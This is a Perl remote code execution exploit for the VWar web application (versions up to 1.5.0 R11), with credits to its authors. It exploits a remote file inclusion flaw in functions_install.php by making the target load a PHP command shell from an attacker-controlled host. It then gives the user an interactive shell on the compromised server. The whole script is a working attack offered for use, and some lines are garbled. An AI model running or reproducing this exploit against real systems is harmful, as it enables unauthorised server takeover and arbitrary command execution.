#!/usr/bin/perl
##
# VWar <= 1.5.0 R11 Remote Code Execution Exploit
# Bug Found By [Oo] code by uid0/zod
## 
#!/usr/bin/perl
##
# VWar <= 1.5.0 R11 Remote Code Execution Exploit
# Bug Found By [Oo] code by uid0/zod
## 
# (c) 2006
# ExploiterCode.com
##
# usage:
# perl vwar.pl <location of VWar> <cmd shell location> <cmd shell variable>
#
# perl vwar.pl http://site.com/vwar/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
##
# hai to: nex, kutmaster, spic, cijfer ;P, ReZeN, wr0ck, blackhat-alliance.org, and everyone else!
#
# special shout to [ill]will!
##
# Contact: www.exploitercode.com irc.exploitercode.com uid0@exploitercode.com
##

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];

if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv){usage()}

head();

while()
{
	print "[shell] \$";
while(<STDIN>)
        {
                $cmd=$_;
                chomp($cmd);
         
$xpl = LWP::UserAgent->new() or die;
$req = HTTP::Request->new(GET =>$Path.'includes/functions_install.php?vwar_root='.$Pathtocmd.'?&'.$cmdv.'='.$cmd)or die "\nCould Not connect\n";

$res = $xpl->request($req);
$return = $res->content;
$return =~ tr/[\n]/[ê;

if (!$cmd) {print "\nPlease Enter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot execute a blank command in <b>/)
	{print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}
elsif ($return =~/^<br.\/>.<b>Fatal.error/) {print "\nInvalid Command or No Return\n\n"}

if($return =~ /(.*)/)


{
	$finreturn = $1;
	$finreturn=~ tr/[ê[\n]/;
	print "\r\n$finreturn\n\r";
	last;
}

else {print "[shell] \$";}}}last;

sub head()
 {
 print "\n============================================================================\r\n";
 print " 	   *VWar <= 1.5.0 R11 Remote Code Execution Exploit*\r\n";   
 print "============================================================================\r\n";
 }
sub usage()
 {
 head();
 print " Usage: perl vwar.pl <location of VWar> <cmd shell location> <cmd shell variable>\r\n\n";
 print " <Site> - Full path to VWar ex: http://www.site.com/vwar/ \r\n";
 print " <cmd shell> - Path to cmd Shell e.g http://www.different-site.com/cmd.txt \r\n";
 print " <cmd variable> - Command variable used in php shell \r\n";
 print "============================================================================\r\n";
 print "		           Bug Found by [Oo] code by zod/uid0\r\n";
 print "	www.exploitercode.com irc.exploitercode.com #exploitercode\r\n";
 print "============================================================================\r\n";
 exit();
 }